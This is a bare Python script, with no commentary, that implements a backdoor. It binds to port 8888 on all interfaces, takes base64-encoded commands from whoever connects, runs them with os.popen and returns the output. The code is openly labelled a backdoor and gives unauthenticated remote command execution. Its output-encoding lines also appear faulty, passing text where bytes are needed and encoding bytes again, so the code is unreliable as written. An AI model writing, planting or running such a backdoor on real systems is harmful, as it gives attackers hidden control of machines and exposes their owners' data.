import socket
import os
import base64

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
server_socket.bind(('0.0.0.0', 8888))
server_socket.listen(1)

client_socket, client_addr = server_socket.accept()
open_backdoor = 1
request = client_socket.recv(1024)

while open_backdoor:
	request = request.decode('utf-8')
	request = base64.b64decode(request)
	request = request.decode('utf-8')
	print("Request shell: "+request)
	if request != "stop":
		response = os.popen(request).read()
		response = base64.b64encode(response)
		response = response.encode()
		client_socket.sendall(response)
		request = client_socket.recv(1024)
	else:
		open_backdoor = 0

client_socket.close()
